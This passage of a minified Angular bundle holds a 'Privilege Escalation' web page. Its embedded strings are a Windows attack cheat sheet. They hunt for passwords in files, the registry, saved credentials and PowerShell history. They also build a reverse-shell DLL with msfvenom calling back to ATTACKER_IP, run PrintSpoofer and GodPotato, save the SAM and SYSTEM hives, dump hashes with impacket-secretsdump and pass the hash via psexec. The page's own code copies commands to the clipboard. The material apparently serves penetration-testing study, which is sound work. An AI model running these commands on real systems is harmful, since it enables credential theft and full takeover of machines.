driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path
Get-WmiObject Win32_PnPSignedDriver | Select DeviceName,DriverVersion,Manufacturer
`;windowsNetwork=`
ipconfig /all
route print
arp -a
mountvol
`;windowsCredentialHunting=`
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config

dir /s *pass*
dir /s *cred*
dir /s *vnc*

dir /b /s unattend.xml
dir /b /s sysprep.inf
`;windowsRegistryCredentials=`
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon"
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
reg query "HKCU\\Software\\TightVNC\\Server"
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
`;windowsSavedCredentials=`
cmdkey /list
`;windowsPowerShellHistory=`
type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

findstr /i password %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i user %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i net %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i cmdkey %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

doskey /history

type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
`;windowsInterestingFiles=`
dir /s /b *.txt
dir /s /b C:\\*.kdbx
dir /s /b *.config
dir /s /b *.conf
dir /s /b *.ini
dir /s /b *.xml
dir /s /b *.json
dir /s /b *.ps1
dir /s /b *.bat
dir /s /b *.cmd
dir /s /b *.docx
dir /s /b *.xlsx
dir /s /b *.pdf
dir /s /b *.zip
dir /s /b *.bak
dir /s /b *.old

dir /s /b *password*
dir /s /b *pass*
dir /s /b *cred*
dir /s /b *secret*
dir /s /b *config*
dir /s /b *backup*
dir /s /b *vpn*
dir /s /b *rdp*
dir /s /b *ssh*
dir /s /b *id_rsa*

findstr /spin "password" *
findstr /spin "passwd" *
findstr /spin "pwd" *
findstr /spin "username" *
findstr /spin "connectionstring" *
findstr /spin "apikey" *
findstr /spin "token" *
findstr /spin "secret" *

C:\\Users\\
C:\\Users\\Public\\
C:\\ProgramData\\
C:\\Temp\\
C:\\Windows\\Temp\\
C:\\inetpub\\
C:\\Scripts\\
C:\\Backup\\
C:\\Backups\\
C:\\Tools\\

web.config
app.config
applicationHost.config
Unattend.xml
sysprep.xml
sysprep.inf
`;windowsServices=`
sc query
sc qc ServiceName
wmic service get name,displayname,pathname,startmode

Get-CimInstance Win32_Service | Select Name,State,StartMode,StartName,PathName
`;windowsUnquotedPaths=`
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

Get-CimInstance Win32_Service | Select Name,PathName,StartName
`;windowsServiceBinary=`
Get-CimInstance Win32_Service |
Where-Object {$_.StartName -like "*LocalSystem*"} |
Select Name, State, StartMode, StartName

icacls "C:\\Path\\To\\ServiceBinary.exe"

sc qc ServiceName
`;windowsServiceRule=`
WRITE + SYSTEM + EXECUTION TRIGGER = EXPLOIT
`;windowsDLLHijacking=`
icacls C:\\ServiceDirectory

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o malicious.dll

sc stop ServiceName
sc start ServiceName
`;windowsScheduledTasks=`
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\\Microsoft*'} | Format-Table TaskName,TaskPath,State"

Get-ScheduledTask | where {$_.TaskPath -notlike '\\Microsoft*'} | Format-Table TaskName,TaskPath,State

schtasks /query
schtasks /query /fo TABLE
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v > tasks.txt
`;windowsTaskFiltering=`
findstr /i "TaskName Author Run As User Task To Run" tasks.txt

findstr /i "powershell cmd.exe .ps1 .bat .cmd" tasks.txt

findstr /i "\\Microsoft\\" tasks.txt
`;windowsTaskInspect=`
schtasks /query /tn "\\TaskName" /fo LIST /v

Get-ScheduledTask

Get-ScheduledTask | Select TaskName,TaskPath,State

(Get-ScheduledTask "TaskName").Actions
`;windowsTaskFiles=`
dir C:\\ /s *.ps1
dir C:\\ /s *.bat
dir C:\\ /s *.cmd
dir C:\\ /s *.vbs
dir C:\\ /s *.xml
dir C:\\ /s *.config
dir C:\\ /s *.ini

dir C:\\Windows\\System32\\Tasks /s

findstr /spin "password passwd pwd secret token user uid connectionstring" *.xml *.config *.ini *.txt *.ps1 *.bat *.cmd
`;windowsTaskPermissions=`
icacls C:\\Path\\To\\TaskBinary.exe

icacls C:\\Path\\To\\Script.ps1

.accesschk64.exe /accepteula -s -d C:\\Scripts\\
`;windowsSeImpersonate=`
whoami /priv
`;windowsPotato=`
PrintSpoofer64.exe -i -c cmd

GodPotato.exe -cmd cmd
`;windowsBackupOperators=`
reg save HKLM\\SAM sam
reg save HKLM\\SYSTEM system
`;windowsSecretsDump=`
impacket-secretsdump -sam sam -system system LOCAL
`;windowsPassTheHash=`
impacket-psexec -hashes :NTHASH Administrator@IP
`;windowsKernel=`
systeminfo
wmic qfe get HotFixID

searchsploit Windows <version>
`;windowsAutomatedEnum=`
.\\winPEASx64.exe
.\\winPEAS.exe

Set-ExecutionPolicy Bypass -Scope Process -Force

Unblock-File .\\PowerUp.ps1
. .\\PowerUp.ps1
Invoke-AllChecks

Unblock-File .\\PrivescCheck.ps1
. .\\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Report PrivescCheck.txt

.\\Seatbelt.exe -group=all
`;windowsManualVerify=`
icacls "C:\\Program Files\\..."

sc.exe qc ServiceName

schtasks /query /fo LIST /v

whoami /priv
`;selectTech(o){this.selected=o,this.router.navigate([],{relativeTo:this.route,queryParams:{system:o},replaceUrl:!0})}back(){this.selected="linux"}copy(o){navigator.clipboard.writeText(o)}static \u0275fac=function(i){return new(i||s)};static \u0275cmp=u({type:s,selectors:[["app-privesc"]],decls:15,vars:4,consts:[[1,"scan-page"],[1,"terminal-path"],[1,"prompt"],[1,"title"],[1,"page-description"],[1,"section-workspace"],[1,"section-workspace__index",3,"sectionChange","items","activeId"],[1,"section-workspace__content"],[4,"ngIf"],[1,"detail"],[1,"section-description"],["multi",""],[3,"command"]],template:function(i,m){i&1&&(n(0,"div",0)(1,"div",1)(2,"span",2),t(3,"~"),e(),t(4,"/get.sh/privesc"),e(),l(5,"br"),n(6,"h1",3),t(7,"Privilege Escalation"),e(),n(8,"p",4),t(9," Linux and Windows privilege escalation enumeration, misconfigurations and common vectors. "),e(),n(10,"div",5)(11,"app-section-index",6),E("sectionChange",function(I){return m.selectTech(I)}),e(),n(12,"div",7),S(13,A,392,44,"ng-container",8)(14,H,336,28,"ng-container",8),e()()()),i&2&&(a(11),r("items",m.systems)("activeId",m.selected??""),a(2),r("ngIf",m.selected==="linux"),a(),r("ngIf",m.selected==="windows"))},dependencies:[w,g,C,P,b,f,k,_,M],styles:[".privesc-page[_ngcontent-%COMP%]{padding:2rem;color:#e2e8f0;max-width:1200px;margin:0 auto}.title[_ngcontent-%COMP%]{font-size:30px;font-weight:700;margin:0 0 .5rem;color:#f8fafc}.page-description[_ngcontent-%COMP%]{margin:0 0 2rem;color:#64748b;font-size:14px}.terminal-path[_ngcontent-%COMP%]{margin-bottom:.5rem;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;color:#64748b}.terminal-path[_ngcontent-%COMP%]   .prompt[_ngcontent-%COMP%]{color:#38bdf8}.privesc-section[_ngcontent-%COMP%]{margin-bottom:3rem}.section-header[_ngcontent-%COMP%]{display:flex;align-items:center;gap:1rem;margin-bottom:1.25rem}.section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0;color:#94a3b8;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;font-weight:700;letter-spacing:.15em;white-space:nowrap}.section-line[_ngcontent-%COMP%]{height:1px;flex:1;background:#1e293b}.grid[_ngcontent-%COMP%]{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1rem}.card[_ngcontent-%COMP%]{position:relative;display:flex;align-items:flex-start;gap:1rem;min-height:130px;padding:1.25rem;background:#111827;border:1px solid #1e293b;border-radius:12px;cursor:pointer;transition:transform .2s ease,border-color .2s ease,background .2s ease,box-shadow .2s ease}.card[_ngcontent-%COMP%]:hover{transform:translateY(-4px);border-color:#2563eb;background:#172033;box-shadow:0 8px 25px #00000040,0 0 15px #2563eb14}.card-icon[_ngcontent-%COMP%]{flex-shrink:0;width:46px;height:46px;display:flex;align-items:center;justify-content:center;border-radius:10px;background:#0b1220;border:1px solid #1e3a5f;color:#38bdf8;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:18px;font-weight:700;transition:border-color .2s ease,color .2s ease,background .2s ease}.card[_ngcontent-%COMP%]:hover   .card-icon[_ngcontent-%COMP%]{border-color:#2563eb;color:#60a5fa;background:#0f172a}.card-content[_ngcontent-%COMP%]{min-width:0}.card[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .45rem;color:#f8fafc;font-size:17px;font-weight:650}.card[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:13px;line-height:1.5}.detail[_ngcontent-%COMP%]{display:flex;flex-direction:column;gap:1rem}.detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0;font-size:30px;font-weight:700;color:#f8fafc}.section-description[_ngcontent-%COMP%]{margin:-.5rem 0 1rem;color:#94a3b8;font-size:14px}.back[_ngcontent-%COMP%]{background:transparent;border:1px solid #334155;color:#e2e8f0;padding:8px 12px;border-radius:8px;cursor:pointer;width:fit-content;transition:background .2s ease,border-color .2s ease,color .2s ease}.back[_ngcontent-%COMP%]:hover{background:#1e293b;border-color:#3b82f6;color:#60a5fa}mat-expansion-panel[_ngcontent-%COMP%]{background:#1e293b!important;color:#e2e8f0!important;border-radius:10px!important;margin-bottom:10px;border:1px solid #334155;box-shadow:none!important}mat-expansion-panel-header[_ngcontent-%COMP%]{color:#e2e8f0!important;background:transparent!important;min-height:52px}mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#243449!important}mat-panel-title[_ngcontent-%COMP%]{color:#e2e8f0!important;font-weight:600}.detail[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{color:#cbd5e1;line-height:1.6}.detail[_ngcontent-%COMP%]   strong[_ngcontent-%COMP%]{color:#f8fafc}.detail[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]{color:#cbd5e1;line-height:1.8;padding-left:1.5rem}@media(max-width:768px){.privesc-page[_ngcontent-%COMP%]{padding:1rem}.title[_ngcontent-%COMP%]{font-size:24px}.grid[_ngcontent-%COMP%]{grid-template-columns:1fr}.detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{font-size:26px}mat-expansion-panel-header[_ngcontent-%COMP%]{padding:0 12px}}"]})};export{O as Privesc};
